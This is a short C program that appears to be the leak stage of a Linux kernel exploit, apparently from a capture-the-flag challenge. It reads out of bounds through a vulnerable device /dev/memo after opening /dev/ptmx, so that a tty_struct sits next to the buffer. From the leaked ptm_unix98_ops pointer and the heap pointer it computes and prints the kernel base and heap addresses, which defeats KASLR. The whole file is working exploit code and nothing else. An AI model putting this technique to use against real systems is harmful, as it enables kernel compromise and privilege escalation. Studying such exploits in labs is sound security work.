#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<sys/ioctl.h>
#include<sys/types.h>

#define ulong unsigned long

int main(void)
{
  int memo = open("/dev/memo",O_RDWR);
  int ptmx = open("/dev/ptmx",O_RDWR | O_NOCTTY);
  char buf[0x400];
  ulong off_ptm_unix98_ops_kernbase = 0x6191e0;
  ulong off_kernheap = 0x438;
  ulong kernbase, kernheap;

  lseek(memo,0x300,SEEK_SET);
  read(memo,buf,0x400);

  kernbase = *(unsigned long*)(buf + 0x100 + 0x18) - off_ptm_unix98_ops_kernbase;
  printf("kernbase: %lx\n",kernbase);
  kernheap = *(unsigned long*)(buf + 0x100 + 0x38) - off_kernheap;
  printf("kernheap: %lx\n",kernheap);

  return 0;
}
